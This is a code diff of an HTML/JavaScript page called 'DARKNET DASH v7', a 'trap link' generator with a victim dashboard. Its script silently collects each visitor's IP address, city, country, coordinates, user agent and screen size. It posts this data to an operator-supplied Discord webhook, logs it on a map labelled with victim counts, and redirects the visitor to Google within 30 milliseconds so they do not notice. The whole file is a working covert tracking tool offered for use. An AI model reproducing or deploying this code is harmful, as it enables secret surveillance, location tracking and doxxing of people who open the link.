@@ -1,244 +1,378 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>DARKNET DASH</title>
+  <title>DARKNET DASH v7</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     :root {
-      --bg: #0a0a0a; --card: #111; --acc: #00ff41; --text: #e0e0e0; --gray: #333;
+      --bg-img: url('https://i.pinimg.com/1200x/45/90/bd/4590bd6b05811ded558e7cf1e4d0573f.jpg');
+      --card: rgba(255, 255, 255, 0.05);
+      --border: rgba(255, 255, 255, 0.18);
+      --text: rgba(255, 255, 255, 0.98);
+      --accent: #00eaff;
+      --glow: 0 0 18px rgba(0, 234, 255, 0.32);
+      --blur: blur(8px); /* Artistic blur — image visible, not distracting */
+      --radius: 26px;
     }
-    * { box-sizing: border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      margin: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif;
-      padding: 20px; line-height: 1.6;
+      background: var(--bg-img) no-repeat center center fixed;
+      background-size: cover;
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
     }
-    .container { max-width: 900px; margin: auto; }
-    .header {
-      text-align: center; padding: 20px; border-bottom: 2px solid var(--acc);
-      margin-bottom: 30px;
-    }
-    .header h1 {
-      margin: 0; color: var(--acc); font-size: 2.5rem; text-shadow: 0 0 10px var(--acc);
-    }
-    .header p { margin: 10px 0 0; opacity: 0.8; }
 
-    .grid {
-      display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
+    /* BLURRED BACKGROUND — ARTISTIC, NOT HARSH */
+    .bg-blur {
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      background: inherit;
+      background-size: cover;
+      filter: var(--blur);
+      z-index: 0;
     }
-    @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
 
-    .card {
-      background: var(--card); border: 2px solid var(--acc); border-radius: 16px;
-      padding: 24px; box-shadow: 0 0 20px rgba(0,255,65,0.2);
+    .container { position:relative; z-index:2; max-width:1450px; margin:auto; padding:32px; }
+
+    /* LOGIN / SIGNUP — FULLY WORKING */
+    #auth {
+      position: fixed; top:0; left:0; width:100%; height:100%; z-index:999;
+      display: flex; align-items: center; justify-content: center;
+      backdrop-filter: blur(12px);
     }
-    h2 { margin: 0 0 16px; color: var(--acc); font-size: 1.4rem; }
-
-    input, button {
-      width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; font-size: 1rem;
+    .auth-box {
+      background: var(--card); border: 1px solid var(--border); border-radius: var(--radius);
+      padding: 48px; width: 90%; max-width: 460px; text-align: center;
+      box-shadow: var(--glow), inset 0 0 30px rgba(0,0,0,0.2);
+      animation: fadeIn 1.1s ease-out;
+    }
+    .auth-box h2 {
+      font-family: 'Space Grotesk', sans-serif; font-size: 2.6rem; margin-bottom: 32px;
+      background: linear-gradient(90deg, #00eaff, #ffffff); -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 12px rgba(0,234,255,0.35);
     }
     input {
-      background: #000; border: 1px solid var(--acc); color: var(--text);
+      width:100%; padding:19px; margin:15px 0; background: rgba(255,255,255,0.07);
+      border: 1px solid var(--border); border-radius: 18px; color: #fff;
+      font-size: 1.1rem; transition: 0.35s;
     }
+    input:focus { outline:none; border-color: var(--accent); box-shadow: var(--glow); }
     button {
-      background: var(--acc); color: #000; border: none; font-weight: bold;
-      cursor: pointer; transition: 0.3s;
+      width:100%; padding:19px; margin:22px 0 0; background: var(--accent);
+      color: #000; border:none; border-radius: 18px; font-weight:700; cursor:pointer;
+      font-size:1.25rem; transition:0.35s; text-transform:uppercase;
+      letter-spacing:0.6px;
     }
-    button:hover { background: #00cc33; transform: translateY(-2px); }
+    button:hover { background:#00d5ff; transform:translateY(-4px); box-shadow:0 12px 35px rgba(0,234,255,0.4); }
+
+    /* DASHBOARD */
+    .header {
+      text-align:center; padding:45px 0; margin-bottom:45px;
+    }
+    .header h1 {
+      font-family:'Space Grotesk',sans-serif; font-size:4.2rem; margin:0;
+      background:linear-gradient(90deg,#00eaff,#ffffff); -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent; text-shadow:var(--glow);
+    }
+    .header p { margin:20px 0 0; font-size:1.25rem; opacity:0.95; }
+
+    .grid { display:grid; grid-template-columns:1fr 1fr; gap:38px; margin-bottom:45px; }
+    @media (max-width:992px) { .grid { grid-template-columns:1fr; } }
+
+    .card {
+      background: var(--card); border:1px solid var(--border); border-radius:var(--radius);
+      padding:38px; box-shadow:var(--glow); backdrop-filter: blur(14px);
+      transition:transform 0.45s, box-shadow 0.45s;
+    }
+    .card:hover { transform:translateY(-12px); box-shadow:0 30px 70px rgba(0,234,255,0.35); }
+    h2 {
+      font-family:'Space Grotesk',sans-serif; font-size:2rem; margin-bottom:28px;
+      color:var(--accent); text-shadow:0 0 12px var(--accent);
+    }
 
     label {
-      display: flex; align-items: center; margin: 12px 0; font-size: 1rem;
+      display:flex; align-items:center; margin:22px 0; font-size:1.15rem;
     }
     input[type="checkbox"] {
-      width: auto; transform: scale(1.3); margin-right: 12px;
+      width:auto; margin-right:18px; accent-color:var(--accent); transform:scale(1.45);
     }
 
     #generated {
-      background: #000; padding: 16px; border-radius: 10px; margin: 16px 0;
-      word-break: break-all; display: none;
+      background:rgba(0,0,0,0.18); padding:26px; border-radius:20px; margin:26px 0;
+      border:1px dashed var(--accent); display:none; animation:fadeIn 0.9s;
     }
-    #qr { text-align: center; margin: 16px 0; }
-    #qr img { border: 2px solid var(--acc); border-radius: 12px; }
+    #link {
+      font-weight:700; word-break:break-all; color:var(--accent); font-size:1.25rem;
+      text-shadow:0 0 7px var(--accent);
+    }
+
+    .btn-group {
+      display:flex; gap:18px; margin-top:20px;
+    }
+    .btn-group button {
+      flex:1; background:rgba(255,255,255,0.09); color:#fff; font-weight:600;
+      padding:16px; border-radius:16px;
+    }
+    .btn-group button:hover { background:rgba(0,234,255,0.18); }
+
+    #map { height:400px; border-radius:20px; margin:26px 0; border:1px solid var(--border); }
+
+    .stats {
+      display:grid; grid-template-columns:repeat(3,1fr); gap:22px; margin:26px 0;
+    }
+    .stat {
+      text-align:center; padding:24px; background:rgba(255,255,255,0.05); border-radius:18px;
+      border:1px solid var(--border);
+    }
+    .stat-num {
+      font-size:2.9rem; font-weight:700; color:var(--accent); text-shadow:0 0 14px var(--accent);
+    }
 
     #logs {
-      max-height: 400px; overflow-y: auto; padding: 10px; background: #000;
-      border-radius: 10px; border: 1px dashed var(--acc);
+      max-height:380px; overflow-y:auto; padding:22px; background:rgba(0,0,0,0.18);
+      border-radius:18px; border:1px dashed var(--border);
     }
     .log {
-      background: var(--gray); padding: 10px; margin: 8px 0;
-      border-left: 4px solid var(--acc); border-radius: 6px; font-size: 0.9rem;
+      background:rgba(255,255,255,0.06); padding:18px; margin:16px 0;
+      border-left:6px solid var(--accent); border-radius:14px; font-size:1.05rem;
+      animation: slideIn 0.6s;
     }
-    .stats {
-      display: flex; justify-content: space-around; padding: 16px 0; font-size: 1.2rem;
-    }
-    .stat { text-align: center; }
-    .stat-num { font-size: 2rem; color: var(--acc); font-weight: bold; }
 
     .footer {
-      text-align: center; margin: 50px 0 20px; font-size: 0.8rem; opacity: 0.5;
+      text-align:center; margin:90px 0 45px; font-size:1.05rem; opacity:0.9;
     }
+
+    @keyframes fadeIn { from{opacity:0; transform:translateY(35px);} to{opacity:1; transform:none;} }
+    @keyframes slideIn { from{opacity:0; transform:translateX(-30px);} to{opacity:1; transform:none;} }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <h1>DARKNET DASH</h1>
-      <p>Generate. Track. Dominate.</p>
-    </div>
 
-    <div class="grid">
-      <!-- GENERATOR -->
-      <div class="card">
-        <h2>CREATE TRAP LINK</h2>
-        <input id="webhook" placeholder="Discord webhook URL" />
+  <!-- BLURRED BACKGROUND LAYER -->
+  <div class="bg-blur"></div>
 
-        <label><input type="checkbox" id="ip" checked> IP + Location</label>
-        <label><input type="checkbox" id="pc" checked> PC Info (Device, Screen, Battery)</label>
-
-        <button onclick="generate()">GENERATE LINK</button>
-
-        <div id="generated">
-          <strong>Your Link:</strong><br>
-          <div id="link"></div>
-          <div style="display:flex;gap:10px;margin-top:10px;">
-            <button onclick="copy()" style="flex:1;">COPY</button>
-            <button onclick="showQR()" style="flex:1;">QR CODE</button>
-          </div>
-          <div id="qr"></div>
-        </div>
-      </div>
-
-      <!-- DASHBOARD -->
-      <div class="card">
-        <h2>LIVE DASHBOARD</h2>
-        <div class="stats">
-          <div class="stat">
-            <div class="stat-num" id="total">0</div>
-            <div>Total Victims</div>
-          </div>
-          <div class="stat">
-            <div class="stat-num" id="today">0</div>
-            <div>Today</div>
-          </div>
-        </div>
-        <button onclick="clearLogs()" style="margin:10px 0;">CLEAR LOGS</button>
-        <div id="logs"></div>
-      </div>
+  <!-- AUTH (FULLY WORKING) -->
+  <div id="auth">
+    <div class="auth-box">
+      <h2 id="auth-title">LOGIN</h2>
+      <input id="username" placeholder="Username" autocomplete="off" />
+      <input id="password" type="password" placeholder="Password" autocomplete="new-password" />
+      <button id="auth-btn">LOGIN</button>
+      <p style="margin-top:24px;"><a href="#" id="toggle-auth" style="color:#00eaff;text-decoration:none;">No account? <strong>Signup</strong></a></p>
     </div>
   </div>
 
-  <div class="footer">© 2025 DARKNET DASH – Built by Rex. No mercy.</div>
+  <!-- DASHBOARD -->
+  <div class="container" id="dashboard" style="display:none;">
+    <div class="header">
+      <h1>DARKNET DASH v7</h1>
+      <p>Live: <span id="live-count">0</span> targets online</p>
+    </div>
+
+    <div class="grid">
+      <div class="card">
+        <h2>TRAP GENERATOR</h2>
+        <input id="webhook" placeholder="Discord Webhook URL" />
+        <label><input type="checkbox" id="ip" checked> IP + Geo</label>
+        <label><input type="checkbox" id="pc" checked> PC Info</label>
+        <button onclick="generate()">GENERATE TRAP</button>
+
+        <div id="generated">
+          <strong>VICTIM LINK:</strong><br>
+          <div id="link"></div>
+          <div class="btn-group">
+            <button onclick="copyLink()">COPY</button>
+            <button onclick="showQR()">QR</button>
+          </div>
+          <div id="qr" style="text-align:center;margin-top:20px;"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>LIVE FEED</h2>
+        <div class="stats">
+          <div class="stat"><div class="stat-num" id="total">0</div><div>Total</div></div>
+          <div class="stat"><div class="stat-num" id="today">0</div><div>Today</div></div>
+          <div class="stat"><div class="stat-num" id="online">0</div><div>Live</div></div>
+        </div>
+        <button onclick="clearLogs()" style="margin:22px 0;width:100%;background:rgba(255,0,0,0.14);color:#fff;font-weight:600;">CLEAR ALL LOGS</button>
+        <div id="logs"></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>WORLD MAP</h2>
+      <div id="map"></div>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2025 DARKNET DASH v7 – Built by Rex. <span style="color:#00eaff;">Blur is beauty. Power is yours.</span>
+  </div>
 
   <script>
     const rand = () => Math.random().toString(36).substr(2, 9);
-    let logs = JSON.parse(localStorage.getItem("dash_logs") || "[]");
-    renderDashboard();
+    let logs = JSON.parse(localStorage.getItem("dd_logs") || "[]");
+    let users = JSON.parse(localStorage.getItem("dd_users") || "[]");
+    let currentUser = null;
+    let map, markerLayer;
+
+    // AUTH — FULLY WORKING
+    const auth = document.getElementById("auth");
+    const title = document.getElementById("auth-title");
+    const btn = document.getElementById("auth-btn");
+    const toggle = document.getElementById("toggle-auth");
+
+    toggle.onclick = (e) => {
+      e.preventDefault();
+      const isLogin = title.innerText === "LOGIN";
+      title.innerText = isLogin ? "SIGNUP" : "LOGIN";
+      btn.innerText = isLogin ? "SIGNUP" : "LOGIN";
+      toggle.innerHTML = isLogin ? 'Have account? <strong>Login</strong>' : 'No account? <strong>Signup</strong>';
+    };
+
+    btn.onclick = () => {
+      const u = document.getElementById("username").value.trim();
+      const p = document.getElementById("password").value;
+      if (!u || !p) return alert("Fill all fields");
+
+      if (title.innerText === "SIGNUP") {
+        if (users.find(x => x.u === u)) return alert("Username taken");
+        users.push({ u, p });
+        localStorage.setItem("dd_users", JSON.stringify(users));
+        alert("Account created! Now login.");
+        title.innerText = "LOGIN";
+        btn.innerText = "LOGIN";
+        toggle.innerHTML = 'No account? <strong>Signup</strong>';
+      } else {
+        const user = users.find(x => x.u === u && x.p === p);
+        if (!user) return alert("Invalid username or password");
+        currentUser = u;
+        auth.style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+        initMap();
+        render();
+      }
+    };
+
+    function initMap() {
+      map = L.map('map').setView([20, 0], 2);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+      markerLayer = L.layerGroup().addTo(map);
+      updateMap();
+    }
+
+    function updateMap() {
+      markerLayer.clearLayers();
+      logs.slice(-50).forEach(l => {
+        if (l.lat) {
+          L.circleMarker([l.lat, l.lon], {
+            radius: 10, color: '#00eaff', fillOpacity: 1, weight: 3.5
+          }).addTo(markerLayer)
+            .bindPopup(`<b style="color:#00eaff;">${l.ip}</b><br>${l.city}, ${l.country}<br>${l.time}`);
+        }
+      });
+    }
 
     function generate() {
-      const webhook = document.getElementById("webhook").value.trim();
-      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid webhook required.");
+      if (!currentUser) return;
+      const w = document.getElementById("webhook").value.trim();
+      if (!w.includes("discord.com/api/webhooks")) return alert("Invalid webhook");
 
-      const config = {
-        w: webhook,
-        ip: document.getElementById("ip").checked,
-        pc: document.getElementById("pc").checked
-      };
-
+      const cfg = { w, ip: document.getElementById("ip").checked, pc: document.getElementById("pc").checked };
       const id = rand();
       const link = `${location.origin}/?id=${id}`;
-      localStorage.setItem(`trap_${id}`, JSON.stringify(config));
+      localStorage.setItem(`trap_${id}`, JSON.stringify(cfg));
 
       document.getElementById("link").innerText = link;
       document.getElementById("generated").style.display = "block";
       document.getElementById("qr").innerHTML = "";
     }
 
-    function copy() {
-      navigator.clipboard.writeText(document.getElementById("link").innerText);
-      alert("Copied to clipboard!");
-    }
-
+    function copyLink() { navigator.clipboard.writeText(document.getElementById("link").innerText); alert("Copied!"); }
     function showQR() {
-      const link = document.getElementById("link").innerText;
-      const qr = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(link)}`;
-      document.getElementById("qr").innerHTML = `<img src="${qr}" alt="QR Code" />`;
+      const l = document.getElementById("link").innerText;
+      document.getElementById("qr").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(l)}" style="border:2px solid #00eaff;border-radius:20px;">`;
     }
 
-    function renderDashboard() {
-      const box = document.getElementById("logs");
-      box.innerHTML = "";
-      const recent = logs.slice(-10).reverse();
-      recent.forEach(l => {
-        const div = document.createElement("div");
-        div.className = "log";
-        div.innerHTML = `<strong>${l.time}</strong><br>${l.ip} – ${l.loc}<br>${l.device.slice(0,40)}...`;
-        box.appendChild(div);
+    function render() {
+      const box = document.getElementById("logs"); box.innerHTML = "";
+      logs.slice(-12).reverse().forEach(l => {
+        const d = document.createElement("div"); d.className = "log";
+        d.innerHTML = `<strong>${l.time}</strong> • ${l.ip}<br>${l.city}, ${l.country}<br><small>${l.ua.slice(0,60)}...</small>`;
+        box.appendChild(d);
       });
       document.getElementById("total").innerText = logs.length;
       const today = logs.filter(l => l.date === new Date().toLocaleDateString()).length;
       document.getElementById("today").innerText = today;
+      document.getElementById("online").innerText = logs.filter(l => Date.now() - l.ts < 300000).length;
+      updateMap();
     }
 
-    function clearLogs() {
-      logs = [];
-      localStorage.setItem("dash_logs", "[]");
-      renderDashboard();
+    function clearLogs() { 
+      if (confirm("Delete ALL logs?")) { 
+        logs = []; localStorage.setItem("dd_logs", "[]"); render(); 
+      } 
     }
 
-    // === VICTIM TRAP ===
+    // === SILENT LOGGING + INSTANT REDIRECT ===
     if (location.search) {
       const id = new URLSearchParams(location.search).get("id");
       const cfg = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
-      if (!cfg.w) { location.href = "https://google.com"; return; }
-
-      document.body.innerHTML = `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#0f0;font-family:monospace;"><h2>Loading...</h2></div>`;
+      const webhook = cfg.w;
 
       (async () => {
-        const fields = [];
         let ipData = {};
+        const fields = [];
+
+        try { ipData = await (await fetch("https://ipapi.co/json/")).json(); } catch(e) {}
 
         if (cfg.ip) {
-          try {
-            ipData = await (await fetch("https://ipapi.co/json/")).json();
-            fields.push(
-              { name: "IP", value: ipData.ip, inline: true },
-              { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-              { name: "ISP", value: ipData.org || "??", inline: true }
-            );
-          } catch(e) {}
+          fields.push({ name: "IP", value: ipData.ip || "??", inline: true });
+          fields.push({ name: "Location", value: `${ipData.city || "?"}, ${ipData.country_name || "?"}`, inline: true });
         }
-
         if (cfg.pc) {
           const bat = await navigator.getBattery?.() || {};
-          fields.push(
-            { name: "Device", value: navigator.userAgent.slice(0,100), inline: false },
-            { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
-            { name: "Battery", value: bat.level ? Math.round(bat.level*100)+"%" : "N/A", inline: true }
-          );
+          fields.push({ name: "Device", value: navigator.userAgent.slice(0,100), inline: false });
+          fields.push({ name: "Screen", value: `${screen.width}x${screen.height}`, inline: true });
         }
 
-        await fetch(cfg.w, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            embeds: [{ title: "NEW VICTIM", color: 65280, fields, timestamp: new Date().toISOString() }]
-          })
-        });
+        if (webhook && fields.length) {
+          await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [{ title: "TARGET ACQUIRED", color: 3447003, fields, timestamp: new Date().toISOString() }] })
+          });
+        }
 
-        // SAVE TO DASHBOARD
-        const logEntry = {
+        const entry = {
           time: new Date().toLocaleTimeString(),
           date: new Date().toLocaleDateString(),
+          ts: Date.now(),
           ip: ipData.ip || "??",
-          loc: `${ipData.city || "?"} , ${ipData.country_name || "?"}`,
-          device: navigator.userAgent
+          city: ipData.city || "?",
+          country: ipData.country_name || "?",
+          lat: ipData.latitude,
+          lon: ipData.longitude,
+          ua: navigator.userAgent
         };
-        const all = JSON.parse(localStorage.getItem("dash_logs") || "[]");
-        all.push(logEntry);
-        localStorage.setItem("dash_logs", JSON.stringify(all));
+        const all = JSON.parse(localStorage.getItem("dd_logs") || "[]");
+        all.push(entry);
+        localStorage.setItem("dd_logs", JSON.stringify(all));
 
-        setTimeout(() => location.replace("https://google.com"), 600);
+        setTimeout(() => location.replace("https://google.com"), 30);
       })();
+    } else {
+      setInterval(() => {
+        document.getElementById("live-count").innerText = logs.filter(l => Date.now() - l.ts < 60000).length;
+      }, 5000);
     }
   </script>
 </body>
